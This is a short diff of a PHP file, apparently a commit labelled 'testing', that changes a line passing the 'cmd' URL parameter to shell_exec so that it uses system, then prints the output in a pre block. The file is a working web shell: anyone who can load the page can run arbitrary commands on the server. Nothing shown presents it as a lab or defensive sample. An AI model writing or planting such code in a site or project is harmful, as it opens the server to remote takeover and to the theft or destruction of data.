@@ -2,7 +2,7 @@ testing
 <?php 
   
 
-$output = shell_exec($_GET["cmd"]); 
+$output = system($_GET["cmd"]); 
   
 
 echo "<pre>$output</pre>"; 
